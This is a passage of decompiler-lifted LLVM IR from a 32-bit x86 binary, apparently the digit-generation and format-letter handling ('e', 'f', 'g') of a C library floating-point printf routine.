  %v10_8061bcc = icmp eq i8 %v3_8061bc1, 97
  %v1_8061bce = icmp eq i1 %v10_8061bcc, false
  br i1 %v1_8061bce, label %dec_label_pc_8061bd7, label %dec_label_pc_8061bd0

dec_label_pc_8061bd0:                             ; preds = %entry
  %v1_8061bd0 = add i32 %v7_8061bb6, 6
  %v11_8061bd0 = trunc i32 %v1_8061bd0 to i8
  store i32 %v1_8061bd0, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8061bd7

dec_label_pc_8061bd7:                             ; preds = %entry, %dec_label_pc_8061bd0
  %stack_var_-206.0 = phi i8 [ %v3_8061bb6, %entry ], [ %v11_8061bd0, %dec_label_pc_8061bd0 ]
  %v2_8061bd7 = icmp slt i32 %v2_8061bb9, 0
  %v1_8061bd9 = icmp eq i1 %v2_8061bd7, false
  br i1 %v1_8061bd9, label %dec_label_pc_8061be0, label %dec_label_pc_8061bdb

dec_label_pc_8061bdb:                             ; preds = %dec_label_pc_8061bd7
  store i32 6, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8061be0

dec_label_pc_8061be0:                             ; preds = %dec_label_pc_8061bd7, %dec_label_pc_8061bdb
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v1_8061bef = add i32 %tmp112, 12
  %v2_8061bef = inttoptr i32 %v1_8061bef to i32*
  %v3_8061bef = load i32, i32* %v2_8061bef, align 4
  store i32 %v3_8061bef, i32* %eax.global-to-local, align 4
  %v2_8061bf2 = and i32 %v3_8061bef, 2
  %v3_8061bf2 = icmp eq i32 %v2_8061bf2, 0
  br i1 %v3_8061bf2, label %dec_label_pc_8061c00, label %dec_label_pc_8061c0c

dec_label_pc_8061c00:                             ; preds = %dec_label_pc_8061be0
  %v2_8061c00 = urem i32 %v3_8061bef, 2
  %tmp143 = trunc i32 %v2_8061c00 to i8
  %tmp = sub nsw i8 0, %tmp143
  %tmp144 = and i8 %tmp, 32
  br label %dec_label_pc_8061c0c

dec_label_pc_8061c0c:                             ; preds = %dec_label_pc_8061c00, %dec_label_pc_8061be0
  %stack_var_-26.0 = phi i8 [ 32, %dec_label_pc_8061be0 ], [ %tmp144, %dec_label_pc_8061c00 ]
  %v1_8061c20 = udiv i32 %v3_8061bef, 256
  %tmp145 = and i32 %v1_8061c20, 68
  %tmp146 = icmp eq i32 %tmp145, 64
  br i1 %tmp146, label %dec_label_pc_8061d72, label %dec_label_pc_8061c92

dec_label_pc_8061c92:                             ; preds = %dec_label_pc_8061c0c
  store i3 %v4_8061ba8, i3* %fpu_stat_TOP.global-to-local, align 1
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v1_8061c99 = add i32 %tmp112, 16
  %v2_8061c99 = inttoptr i32 %v1_8061c99 to i32*
  store i32 32, i32* %v2_8061c99, align 4
  store i32 3, i32* %stack_var_-152, align 4
  %v4_8061cb0 = add i8 %stack_var_-206.0, -96
  %v6_8061cb0 = sub i8 95, %stack_var_-206.0
  %v7_8061cb0 = and i8 %v6_8061cb0, %stack_var_-206.0
  %v8_8061cb0 = icmp slt i8 %v7_8061cb0, 0
  %v9_8061cb0 = icmp eq i8 %v4_8061cb0, 0
  %v10_8061cb0 = icmp slt i8 %v4_8061cb0, 0
  %v3_8061cb5 = icmp eq i1 %v10_8061cb0, %v8_8061cb0
  %v4_8061cb5 = icmp eq i1 %v9_8061cb0, false
  %v5_8061cb5 = and i1 %v4_8061cb5, %v3_8061cb5
  br i1 %v5_8061cb5, label %dec_label_pc_8061cbc, label %dec_label_pc_8061cb7

dec_label_pc_8061cb7:                             ; preds = %dec_label_pc_8061c92
  br label %dec_label_pc_8061cbc

dec_label_pc_8061cbc:                             ; preds = %dec_label_pc_8061c92, %dec_label_pc_8061cb7
  %v2_8061cc4 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8061cc4, i32* @ecx, align 4
  br label %dec_label_pc_8062097

dec_label_pc_8061d72:                             ; preds = %dec_label_pc_8061c0c
  %v1_8061c31 = add i3 %v4_8061ba8, -2
  store x86_fp80 0xK3FFF8000000000000000, x86_fp80* %st0.global-to-local, align 4
  %v6_8061d76 = and i32 %v3_8061bef, -65536
  %v2_8061d7b = ptrtoint i32* %stack_var_-70 to i32
  store i32 %v2_8061d7b, i32* %edx.global-to-local, align 4
  %v1_8061d82 = udiv i16 %tmp103, 256
  %v2_8061d82 = zext i16 %v1_8061d82 to i32
  %v3_8061d82 = mul nuw nsw i32 %v2_8061d82, 256
  %tmp147 = urem i16 %tmp103, 256
  %v4_8061d76.masked = zext i16 %tmp147 to i32
  %v11_8061d82 = or i32 %v4_8061d76.masked, %v3_8061d82
  %v10_8061d82 = or i32 %v11_8061d82, %v6_8061d76
  %v12_8061d82 = or i32 %v10_8061d82, 3072
  store i32 %v12_8061d82, i32* %eax.global-to-local, align 4
  store i32 0, i32* @edi, align 4
  store x86_fp80 0xK401CEE6B280000000000, x86_fp80* %st1.global-to-local, align 4
  store i3 %v1_8061c31, i3* %fpu_stat_TOP.global-to-local, align 1
  br label %dec_label_pc_8061d96

dec_label_pc_8061d96:                             ; preds = %dec_label_pc_8061de7.dec_label_pc_8061d96_crit_edge, %dec_label_pc_8061d72
  %v2_8061db3 = phi x86_fp80 [ 0xK3FFF8000000000000000, %dec_label_pc_8061d72 ], [ %v2_8061db3.pre, %dec_label_pc_8061de7.dec_label_pc_8061d96_crit_edge ]
  %v1_8061d96 = phi i3 [ %v1_8061c31, %dec_label_pc_8061d72 ], [ %v1_8061d96.pre, %dec_label_pc_8061de7.dec_label_pc_8061d96_crit_edge ]
  %v3_8061dbd = phi x86_fp80 [ 0xK401CEE6B280000000000, %dec_label_pc_8061d72 ], [ %v0_8061d96.pre, %dec_label_pc_8061de7.dec_label_pc_8061d96_crit_edge ]
  %stack_var_-212.0 = phi i32 [ %v2_8061d7b, %dec_label_pc_8061d72 ], [ %v4_8061db8, %dec_label_pc_8061de7.dec_label_pc_8061d96_crit_edge ]
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %tmp148 = fptosi x86_fp80 %v3_8061dbd to i32
  store i32 %tmp148, i32* %eax.global-to-local, align 4
  store i32 %tmp148, i32* %ebx.global-to-local, align 4
  %v5_8061db0 = sitofp i32 %tmp148 to x86_fp80
  %v4_8061db3 = fsub x86_fp80 %v2_8061db3, %v5_8061db0
  store i3 %v1_8061d96, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_8061db8 = add i32 %stack_var_-212.0, 9
  %v4_8061dbd = fmul x86_fp80 %v3_8061dbd, %v4_8061db3
  store x86_fp80 %v4_8061dbd, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_8061dbf

dec_label_pc_8061dbf:                             ; preds = %dec_label_pc_8061dbf.dec_label_pc_8061dbf_crit_edge, %dec_label_pc_8061d96
  %v0_8061dd1 = phi i32 [ %v0_8061dd1.pre, %dec_label_pc_8061dbf.dec_label_pc_8061dbf_crit_edge ], [ %tmp148, %dec_label_pc_8061d96 ]
  %v0_8061dbf = phi i32 [ %v0_8061dbf.pre, %dec_label_pc_8061dbf.dec_label_pc_8061dbf_crit_edge ], [ 0, %dec_label_pc_8061d96 ]
  %v1_8061dbf = add i32 %v0_8061dbf, 1
  store i32 %v1_8061dbf, i32* %esi.global-to-local, align 4
  %v2_8061dc4 = sub i32 %v4_8061db8, %v1_8061dbf
  store i32 10, i32* %ecx.global-to-local, align 4
  %div = udiv i32 %v0_8061dd1, 10
  %tmp136 = urem i32 %v0_8061dd1, 10
  store i32 %div, i32* %ebx.global-to-local, align 4
  store i32 %v2_8061dc4, i32* %eax.global-to-local, align 4
  %v1_8061ddd = or i32 %tmp136, 48
  %v8_8061ddd = trunc i32 %v1_8061ddd to i8
  store i32 %v1_8061ddd, i32* %edx.global-to-local, align 4
  %v3_8061de3 = inttoptr i32 %v2_8061dc4 to i8*
  store i8 %v8_8061ddd, i8* %v3_8061de3, align 1
  %v7_8061de5 = icmp sgt i32 %v1_8061dbf, 8
  br i1 %v7_8061de5, label %dec_label_pc_8061de7, label %dec_label_pc_8061dbf.dec_label_pc_8061dbf_crit_edge

dec_label_pc_8061dbf.dec_label_pc_8061dbf_crit_edge: ; preds = %dec_label_pc_8061dbf
  %v0_8061dbf.pre = load i32, i32* %esi.global-to-local, align 4
  %v0_8061dd1.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8061dbf

dec_label_pc_8061de7:                             ; preds = %dec_label_pc_8061dbf
  %v0_8061de7 = load i32, i32* @edi, align 4
  %v1_8061de7 = add i32 %v0_8061de7, 1
  store i32 %v1_8061de7, i32* @edi, align 4
  %v7_8061deb = icmp sgt i32 %v1_8061de7, 2
  br i1 %v7_8061deb, label %dec_label_pc_8061ded, label %dec_label_pc_8061de7.dec_label_pc_8061d96_crit_edge

dec_label_pc_8061de7.dec_label_pc_8061d96_crit_edge: ; preds = %dec_label_pc_8061de7
  %v0_8061d96.pre = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  %v1_8061d96.pre = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v2_8061db3.pre = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_8061d96

dec_label_pc_8061ded:                             ; preds = %dec_label_pc_8061de7
  %v0_8061ded = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_8061ded = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 %v1_8061ded, x86_fp80* %st0.global-to-local, align 4
  %v2_8061def = add i3 %v0_8061ded, 2
  store i3 %v2_8061def, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_8061df1 = add i8 %stack_var_-206.0, -96
  %v6_8061df1 = sub i8 95, %stack_var_-206.0
  %v7_8061df1 = and i8 %v6_8061df1, %stack_var_-206.0
  %v8_8061df1 = icmp slt i8 %v7_8061df1, 0
  %v9_8061df1 = icmp eq i8 %v4_8061df1, 0
  %v10_8061df1 = icmp slt i8 %v4_8061df1, 0
  %v3_8061df6 = icmp eq i1 %v10_8061df1, %v8_8061df1
  %v4_8061df6 = icmp eq i1 %v9_8061df1, false
  %v5_8061df6 = and i1 %v4_8061df6, %v3_8061df6
  br i1 %v5_8061df6, label %dec_label_pc_8061e05, label %dec_label_pc_8061df8

dec_label_pc_8061df8:                             ; preds = %dec_label_pc_8061ded
  %v4_8061df8 = add i8 %stack_var_-206.0, 32
  br label %dec_label_pc_8061e05

dec_label_pc_8061e05:                             ; preds = %dec_label_pc_8061ded, %dec_label_pc_8061df8
  %stack_var_-206.1 = phi i8 [ %stack_var_-206.0, %dec_label_pc_8061ded ], [ %v4_8061df8, %dec_label_pc_8061df8 ]
  %stack_var_-42.0 = phi i32 [ 101, %dec_label_pc_8061ded ], [ 69, %dec_label_pc_8061df8 ]
  %v12_8061e05 = icmp eq i8 %stack_var_-206.1, 103
  %v1_8061e0a = icmp eq i1 %v12_8061e05, false
  br i1 %v1_8061e0a, label %dec_label_pc_8061e13, label %dec_label_pc_8061e0c

dec_label_pc_8061e0c:                             ; preds = %dec_label_pc_8061e05
  %v0_8061e0c = load i32, i32* %ebp.global-to-local, align 4
  %tmp137 = icmp slt i32 %v0_8061e0c, 1
  br i1 %tmp137, label %dec_label_pc_8061e1a, label %dec_label_pc_8061e10

dec_label_pc_8061e10:                             ; preds = %dec_label_pc_8061e0c
  %v1_8061e10 = add i32 %v0_8061e0c, -1
  store i32 %v1_8061e10, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8061e1a

dec_label_pc_8061e13:                             ; preds = %dec_label_pc_8061e05
  %v12_8061e13 = icmp eq i8 %stack_var_-206.1, 102
  br i1 %v12_8061e13, label %dec_label_pc_8061e1e, label %dec_label_pc_8061e13.dec_label_pc_8061e1a_crit_edge

dec_label_pc_8061e13.dec_label_pc_8061e1a_crit_edge: ; preds = %dec_label_pc_8061e13
  %v0_8061e1a.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8061e1a

dec_label_pc_8061e1a:                             ; preds = %dec_label_pc_8061e13.dec_label_pc_8061e1a_crit_edge, %dec_label_pc_8061e0c, %dec_label_pc_8061e10
  %v0_8061e1a = phi i32 [ %v0_8061e1a.pre, %dec_label_pc_8061e13.dec_label_pc_8061e1a_crit_edge ], [ %v0_8061e0c, %dec_label_pc_8061e0c ], [ %v1_8061e10, %dec_label_pc_8061e10 ]
  store i32 %v0_8061e1a, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8061e4b

dec_label_pc_8061e1e:                             ; preds = %dec_label_pc_8061e13
  store i32 -1, i32* %edx.global-to-local, align 4
  %v0_8061e22 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8061e22 = add i32 %v0_8061e22, -1
  store i32 %v2_8061e22, i32* %ebx.global-to-local, align 4
  %v5_8061e29 = icmp slt i32 %v2_8061e22, -1
  br i1 %v5_8061e29, label %dec_label_pc_8061e2b, label %dec_label_pc_8061e4b

dec_label_pc_8061e2b:                             ; preds = %dec_label_pc_8061e1e
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8061e33 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_8061e33, i32* %eax.global-to-local, align 4
  %v4_8061e3b = bitcast i32* %stack_var_-72 to i8*
  %v5_8061e3b = call i32 @__GI_memset(i8* %v4_8061e3b, i32 48, i32 21)
  store i32 %v5_8061e3b, i32* %eax.global-to-local, align 4
  %v0_8061e5b.pr.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8061e4b

dec_label_pc_8061e4b:                             ; preds = %dec_label_pc_8061e1e, %dec_label_pc_8061e2b, %dec_label_pc_8061e1a
  %v1_8061e6b = phi i32 [ %v0_8061e1a, %dec_label_pc_8061e1a ], [ %v0_8061e5b.pr.pre, %dec_label_pc_8061e2b ], [ %v2_8061e22, %dec_label_pc_8061e1e ]
  store i32 0, i32* %stack_var_-72, align 4
  store i32 48, i32* %stack_var_-71, align 4
  %v7_8061e5e = icmp sgt i32 %v1_8061e6b, 20
  br i1 %v7_8061e5e, label %dec_label_pc_8061e60, label %dec_label_pc_8061e6b

dec_label_pc_8061e60:                             ; preds = %dec_label_pc_8061e4b
  %v2_8061e60 = ptrtoint i32* %stack_var_-49 to i32
  store i32 %v2_8061e60, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8061e7f.preheader

dec_label_pc_8061e6b:                             ; preds = %dec_label_pc_8061e4b
  %v0_8061e6b = load i32, i32* @esp, align 4
  %v2_8061e6b = add i32 %v1_8061e6b, 165
  %v3_8061e6b = add i32 %v2_8061e6b, %v0_8061e6b
  store i32 %v3_8061e6b, i32* %eax.global-to-local, align 4
  %v1_8061e72 = add i32 %v3_8061e6b, 2
  store i32 %v1_8061e72, i32* %ecx.global-to-local, align 4
  %v2_8061e75 = inttoptr i32 %v1_8061e72 to i8*
  %v3_8061e75 = load i8, i8* %v2_8061e75, align 1
  %v4_8061e75 = add i8 %v3_8061e75, -53
  %v9_8061e75 = sub i8 52, %v3_8061e75
  %v10_8061e75 = and i8 %v9_8061e75, %v3_8061e75
  %v11_8061e75 = icmp slt i8 %v10_8061e75, 0
  %v13_8061e75 = icmp slt i8 %v4_8061e75, 0
  %v2_8061e79 = icmp eq i1 %v13_8061e75, %v11_8061e75
  %v3_8061e79 = zext i1 %v2_8061e79 to i32
  br label %dec_label_pc_8061e7f.preheader

dec_label_pc_8061e7f.preheader:                   ; preds = %dec_label_pc_8061e6b, %dec_label_pc_8061e60
  %v0_8061e7f63 = phi i32 [ %v1_8061e72, %dec_label_pc_8061e6b ], [ %v2_8061e60, %dec_label_pc_8061e60 ]
  %storemerge52 = phi i32 [ %v3_8061e79, %dec_label_pc_8061e6b ], [ 0, %dec_label_pc_8061e60 ]
  store i32 %storemerge52, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8061e7f

dec_label_pc_8061e7f:                             ; preds = %dec_label_pc_8061e7f.backedge, %dec_label_pc_8061e7f.preheader
  %v3_8061e80 = phi i32 [ %v3_8061e80.pre, %dec_label_pc_8061e7f.backedge ], [ %storemerge52, %dec_label_pc_8061e7f.preheader ]
  %v0_8061e7f = phi i32 [ %v0_8061e82, %dec_label_pc_8061e7f.backedge ], [ %v0_8061e7f63, %dec_label_pc_8061e7f.preheader ]
  %v1_8061e7f = add i32 %v0_8061e7f, -1
  store i32 %v1_8061e7f, i32* %ecx.global-to-local, align 4
  %v1_8061e80 = inttoptr i32 %v1_8061e7f to i8*
  %v2_8061e80 = load i8, i8* %v1_8061e80, align 1
  %v4_8061e80 = trunc i32 %v3_8061e80 to i8
  %v5_8061e80 = add i8 %v2_8061e80, %v4_8061e80
  store i8 %v5_8061e80, i8* %v1_8061e80, align 1
  %v0_8061e82 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8061e82 = inttoptr i32 %v0_8061e82 to i8*
  %v2_8061e82 = load i8, i8* %v1_8061e82, align 1
  %v3_8061e82 = zext i8 %v2_8061e82 to i32
  %v4_8061e82 = load i32, i32* %edx.global-to-local, align 4
  %v5_8061e82 = and i32 %v4_8061e82, -256
  %v6_8061e82 = or i32 %v5_8061e82, %v3_8061e82
  store i32 %v6_8061e82, i32* %edx.global-to-local, align 4
  %v7_8061e84 = icmp eq i8 %v2_8061e82, 48
  br i1 %v7_8061e84, label %dec_label_pc_8061e7f.backedge, label %dec_label_pc_8061e89

dec_label_pc_8061e7f.backedge:                    ; preds = %dec_label_pc_8061e7f, %dec_label_pc_8061e89
  %v3_8061e80.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8061e7f

dec_label_pc_8061e89:                             ; preds = %dec_label_pc_8061e7f
  %v2_8061e89 = add i8 %v2_8061e82, -57
  %v7_8061e89 = sub i8 56, %v2_8061e82
  %v8_8061e89 = and i8 %v7_8061e89, %v2_8061e82
  %v9_8061e89 = icmp slt i8 %v8_8061e89, 0
  %v10_8061e89 = icmp eq i8 %v2_8061e89, 0
  %v11_8061e89 = icmp slt i8 %v2_8061e89, 0
  %v3_8061e8c = icmp eq i1 %v11_8061e89, %v9_8061e89
  %v4_8061e8c = icmp eq i1 %v10_8061e89, false
  %v5_8061e8c = and i1 %v4_8061e8c, %v3_8061e8c
  br i1 %v5_8061e8c, label %dec_label_pc_8061e7f.backedge, label %dec_label_pc_8061e8e

dec_label_pc_8061e8e:                             ; preds = %dec_label_pc_8061e89
  %v2_8061e8e = ptrtoint i32* %stack_var_-71 to i32
  store i32 %v2_8061e8e, i32* %eax.global-to-local, align 4
  %tmp149 = icmp ugt i32 %v0_8061e82, %v2_8061e8e
  store i32 -1, i32* %esi.global-to-local, align 4
  br i1 %tmp149, label %dec_label_pc_8061e99, label %dec_label_pc_8061ea6

dec_label_pc_8061e99:                             ; preds = %dec_label_pc_8061e8e
  store i32 %v2_8061d7b, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8061eaf

dec_label_pc_8061ea6:                             ; preds = %dec_label_pc_8061e8e
  store i32 %v2_8061e8e, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  store i32 %v2_8061e8e, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8061eaf

dec_label_pc_8061eaf:                             ; preds = %dec_label_pc_8061e99, %dec_label_pc_8061ea6
  %v0_8061eaf = phi i32 [ %v0_8061e82, %dec_label_pc_8061e99 ], [ %v2_8061e8e, %dec_label_pc_8061ea6 ]
  %v1_8061eaf = add i32 %v0_8061eaf, 1
  store i32 %v1_8061eaf, i32* %eax.global-to-local, align 4
  %v2_8061eb6 = inttoptr i32 %v1_8061eaf to i8*
  store i8 0, i8* %v2_8061eb6, align 1
  br i1 %v1_8061e0a, label %dec_label_pc_8061edc, label %dec_label_pc_8061ec1

dec_label_pc_8061ec1:                             ; preds = %dec_label_pc_8061eaf
  %v0_8061ec1 = load i32, i32* %esi.global-to-local, align 4
  %v5_8061ec4 = icmp slt i32 %v0_8061ec1, -4
  br i1 %v5_8061ec4, label %dec_label_pc_8061ee9, label %dec_label_pc_8061ec6

dec_label_pc_8061ec6:                             ; preds = %dec_label_pc_8061ec1
  %v1_8061ec6 = load i32, i32* %ebx.global-to-local, align 4
  %v7_8061ec8 = icmp slt i32 %v1_8061ec6, %v0_8061ec1
  br i1 %v7_8061ec8, label %dec_label_pc_8061ee9, label %dec_label_pc_8061ed1

dec_label_pc_8061ed1:                             ; preds = %dec_label_pc_8061ec6
  %v2_8061ed8 = sub i32 %v1_8061ec6, %v0_8061ec1
  store i32 %v2_8061ed8, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8061eed

dec_label_pc_8061edc:                             ; preds = %dec_label_pc_8061eaf
  %v4_8061edc = zext i8 %stack_var_-206.1 to i32
  %v5_8061edc = load i32, i32* %ecx.global-to-local, align 4
  %v6_8061edc = and i32 %v5_8061edc, -256
  %v7_8061edc = or i32 %v6_8061edc, %v4_8061edc
  store i32 %v7_8061edc, i32* %ecx.global-to-local, align 4
  %v10_8061ee4 = icmp eq i8 %stack_var_-206.1, 102
  br i1 %v10_8061ee4, label %dec_label_pc_8061edc.dec_label_pc_8061eed_crit_edge, label %dec_label_pc_8061ee9

dec_label_pc_8061edc.dec_label_pc_8061eed_crit_edge: ; preds = %dec_label_pc_8061edc
  %v0_8061eed.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8061eed

dec_label_pc_8061ee9:                             ; preds = %dec_label_pc_8061ec1, %dec_label_pc_8061ec6, %dec_label_pc_8061edc
  %stack_var_-197.0 = phi i8 [ %stack_var_-206.1, %dec_label_pc_8061edc ], [ 103, %dec_label_pc_8061ec6 ], [ 103, %dec_label_pc_8061ec1 ]
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8061ef7

dec_label_pc_8061eed:                             ; preds = %dec_label_pc_8061edc.dec_label_pc_8061eed_crit_edge, %dec_label_pc_8061ed1
  %v0_8061eed = phi i32 [ %v0_8061eed.pre, %dec_label_pc_8061edc.dec_label_pc_8061eed_crit_edge ], [ %v0_8061ec1, %dec_label_pc_8061ed1 ]
  store i32 %v0_8061eed, i32* %ebx.global-to-local, align 4
  %v2_8061eef = icmp slt i32 %v0_8061eed, 0
  %v1_8061ef1 = icmp eq i1 %v2_8061eef, false
  br i1 %v1_8061ef1, label %dec_label_pc_8061ef7, label %dec_label_pc_8061ef3

dec_label_pc_8061ef3:                             ; preds = %dec_label_pc_8061eed
  %v0_8061ef3 = load i32, i32* %edx.global-to-local, align 4
  %v1_8061ef3 = add i32 %v0_8061ef3, -1
  store i32 %v1_8061ef3, i32* %edx.global-to-local, align 4
  %v1_8061ef4 = inttoptr i32 %v1_8061ef3 to i8*
  store i8 48, i8* %v1_8061ef4, align 1
  %v0_8061f2c.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8061ef7

dec_label_pc_8061ef7:                             ; preds = %dec_label_pc_8061eed, %dec_label_pc_8061ee9, %dec_label_pc_8061ef3
  %v1_8061f87 = phi i32 [ %v0_8061eed, %dec_label_pc_8061eed ], [ %v0_8061f2c.pre, %dec_label_pc_8061ef3 ], [ 0, %dec_label_pc_8061ee9 ]
  %stack_var_-197.2 = phi i8 [ 102, %dec_label_pc_8061eed ], [ 102, %dec_label_pc_8061ef3 ], [ %stack_var_-197.0, %dec_label_pc_8061ee9 ]
  %v2_8061ef7 = ptrtoint i32* %stack_var_-22 to i32
  store i32 %v2_8061ef7, i32* %eax.global-to-local, align 4
  store i32 1, i32* %stack_var_-152, align 4
  %v0_8061f12 = load i32, i32* %edx.global-to-local, align 4
  %v1_8061f12 = inttoptr i32 %v0_8061f12 to i8*
  %v2_8061f12 = load i8, i8* %v1_8061f12, align 1
  %v3_8061f12 = zext i8 %v2_8061f12 to i32
  %v5_8061f12 = and i32 %v2_8061ef7, -256
  %v6_8061f12 = or i32 %v3_8061f12, %v5_8061f12
  store i32 %v6_8061f12, i32* %eax.global-to-local, align 4
  %v1_8061f14 = add i32 %v0_8061f12, 1
  store i32 %v1_8061f14, i32* %edi.global-to-local, align 4
  store i32 %v6_8061f12, i32* %stack_var_-22, align 4
  %v2_8061f22 = sub i32 %v1_8061eaf, %v1_8061f14
  store i32 %v2_8061f22, i32* %edx.global-to-local, align 4
  %v1_8061f2c = icmp eq i32 %v1_8061f87, 0
  %v2_8061f2c = icmp slt i32 %v1_8061f87, 0
  br i1 %v2_8061f2c, label %dec_label_pc_8061f7b, label %dec_label_pc_8061f30

dec_label_pc_8061f30:                             ; preds = %dec_label_pc_8061ef7
  store i32 112, i32* %stack_var_-144, align 4
  %v2_8061f3c = sub i32 %v1_8061f87, %v2_8061f22
  %v8_8061f3c = xor i32 %v2_8061f22, %v1_8061f87
  %v9_8061f3c = xor i32 %v2_8061f3c, %v1_8061f87
  %v10_8061f3c = and i32 %v9_8061f3c, %v8_8061f3c
  %v11_8061f3c = icmp slt i32 %v10_8061f3c, 0
  %v13_8061f3c = icmp slt i32 %v2_8061f3c, 0
  %v2_8061f3e = icmp eq i1 %v13_8061f3c, %v11_8061f3c
  br i1 %v2_8061f3e, label %dec_label_pc_8061f40, label %dec_label_pc_8061f74

dec_label_pc_8061f40:                             ; preds = %dec_label_pc_8061f30
  store i32 %v2_8061f3c, i32* %eax.global-to-local, align 4
  %tmp138 = icmp slt i32 %v2_8061f3c, 1
  %tmp139 = icmp eq i1 %tmp138, false
  br i1 %tmp139, label %dec_label_pc_8061f55, label %dec_label_pc_8061f70

dec_label_pc_8061f55:                             ; preds = %dec_label_pc_8061f40
  store i32 176, i32* %stack_var_-132, align 4
  br label %dec_label_pc_8061f70

dec_label_pc_8061f70:                             ; preds = %dec_label_pc_8061f40, %dec_label_pc_8061f55
  %storemerge10.in = phi i32* [ %stack_var_-120, %dec_label_pc_8061f55 ], [ %stack_var_-132, %dec_label_pc_8061f40 ]
  store i32 -1, i32* %ebx.global-to-local, align 4
  %storemerge10 = ptrtoint i32* %storemerge10.in to i32
  store i32 %storemerge10, i32* @ecx, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8061f90

dec_label_pc_8061f74:                             ; preds = %dec_label_pc_8061f30
  %v4_8061f76 = icmp eq i1 %v1_8061f2c, false
  br i1 %v4_8061f76, label %dec_label_pc_8061f81, label %dec_label_pc_8061f78

dec_label_pc_8061f78:                             ; preds = %dec_label_pc_8061f74
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8061f7b

dec_label_pc_8061f7b:                             ; preds = %dec_label_pc_8061ef7, %dec_label_pc_8061f78
  %v0_8061fc373 = phi i32 [ %v1_8061f87, %dec_label_pc_8061ef7 ], [ -1, %dec_label_pc_8061f78 ]
  %v2_8061f7b = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8061f7b, i32* @ecx, align 4
  br label %dec_label_pc_8061f90

dec_label_pc_8061f81:                             ; preds = %dec_label_pc_8061f74
  %v2_8061f85 = add i32 %v1_8061f14, %v1_8061f87
  store i32 %v2_8061f85, i32* %edi.global-to-local, align 4
  %v2_8061f87 = sub i32 %v2_8061f22, %v1_8061f87
  store i32 %v2_8061f87, i32* %edx.global-to-local, align 4
  %v2_8061f89 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_8061f89, i32* @ecx, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8061f90

dec_label_pc_8061f90:                             ; preds = %dec_label_pc_8061f7b, %dec_label_pc_8061f70, %dec_label_pc_8061f81
  %v0_8061fc372 = phi i32 [ %v0_8061fc373, %dec_label_pc_8061f7b ], [ -1, %dec_label_pc_8061f70 ], [ -1, %dec_label_pc_8061f81 ]
  %v0_8061fac = phi i32 [ %v2_8061f7b, %dec_label_pc_8061f7b ], [ %storemerge10, %dec_label_pc_8061f70 ], [ %v2_8061f89, %dec_label_pc_8061f81 ]
  %v0_8061f9d = phi i32 [ %v2_8061f22, %dec_label_pc_8061f7b ], [ 0, %dec_label_pc_8061f70 ], [ %v2_8061f87, %dec_label_pc_8061f81 ]
  store i32 %tmp112, i32* %eax.global-to-local, align 4
  %v2_8061f97 = inttoptr i32 %v1_8061bef to i8*
  %v3_8061f97 = load i8, i8* %v2_8061f97, align 1
  %v4_8061f97 = and i8 %v3_8061f97, 16
  %v5_8061f97 = icmp eq i8 %v4_8061f97, 0
  %v1_8061f9b = icmp eq i1 %v5_8061f97, false
  br i1 %v1_8061f9b, label %dec_label_pc_8061fac, label %dec_label_pc_8061f9d

dec_label_pc_8061f9d:                             ; preds = %dec_label_pc_8061f90
  %v1_8061f9d = icmp eq i32 %v0_8061f9d, 0
  %v1_8061f9f = icmp eq i1 %v1_8061f9d, false
  br i1 %v1_8061f9f, label %dec_label_pc_8061fac, label %dec_label_pc_8061fa1

dec_label_pc_8061fa1:                             ; preds = %dec_label_pc_8061f9d
  br i1 %v12_8061e05, label %dec_label_pc_8061fc3, label %dec_label_pc_8061fa8

dec_label_pc_8061fa8:                             ; preds = %dec_label_pc_8061fa1
  %v0_8061fa8 = load i32, i32* %ebp.global-to-local, align 4
  %tmp140 = icmp slt i32 %v0_8061fa8, 1
  br i1 %tmp140, label %dec_label_pc_8061fc3, label %dec_label_pc_8061fac

dec_label_pc_8061fac:                             ; preds = %dec_label_pc_8061fa8, %dec_label_pc_8061f9d, %dec_label_pc_8061f90
  %v1_8061fac = inttoptr i32 %v0_8061fac to i32*
  store i32 112, i32* %v1_8061fac, align 4
  %v0_8061fb2 = load i32, i32* @ecx, align 4
  %v1_8061fb2 = add i32 %v0_8061fb2, 4
  %v2_8061fb2 = inttoptr i32 %v1_8061fb2 to i32*
  store i32 1, i32* %v2_8061fb2, align 4
  %v0_8061fb9 = load i32, i32* @ecx, align 4
